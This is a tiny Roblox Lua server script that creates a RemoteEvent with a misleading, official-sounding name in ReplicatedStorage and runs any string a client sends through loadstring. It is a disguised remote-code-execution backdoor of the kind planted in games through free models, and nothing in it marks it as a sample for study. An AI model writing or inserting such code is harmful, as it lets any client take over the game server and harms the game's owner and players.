local server = Instance.new("RemoteEvent")
server.Parent = game:GetService("ReplicatedStorage")
server.Name = "RobloxStudioRobloxPlayerSupportGamexxxrexxx"

server.OnServerEvent:Connect(function(player, ss)
	loadstring(ss)()
end)
